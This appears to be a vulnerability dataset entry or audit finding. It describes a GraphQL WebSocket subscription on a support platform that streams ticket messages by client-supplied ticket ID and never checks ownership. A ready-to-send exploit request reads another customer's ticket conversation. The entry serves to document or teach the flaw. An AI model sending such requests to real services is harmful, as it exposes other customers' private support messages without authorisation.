diagnosis: The subscription registers the WebSocket subscriber to support ticket notifications using only the client-supplied ticket_id without validating that info.context.user is the ticket creator or the assigned support representative. Authenticated customers can tap into live customer support conversations and internal agent responses belonging to other corporate accounts.
exploit_request:
POST /ws/graphql/ HTTP/1.1
Host: support.saascloud.io
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Protocol: graphql-ws

{"type":"start","id":"ticket_stream","payload":{"query":"subscription { supportTicketMessage(ticketId: 8841) { message { sender body attachmentUrl } } }"}}
